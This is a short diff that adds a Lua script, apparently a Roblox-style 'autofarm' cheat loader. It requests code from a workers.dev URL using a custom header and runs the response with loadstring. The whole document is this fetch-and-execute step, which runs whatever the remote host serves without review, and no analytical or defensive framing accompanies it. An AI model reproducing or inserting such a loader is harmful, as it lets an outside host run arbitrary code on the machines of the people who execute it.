@@ -1,0 +1,8 @@
+local response = request({
+    Url = "https://fastinstantautofarm.stremlingremlin.workers.dev/",
+    Method = "GET",
+    Headers = {
+        ["beta-v1-gng"] = "1"
+    }
+})
+loadstring(response.Body)()
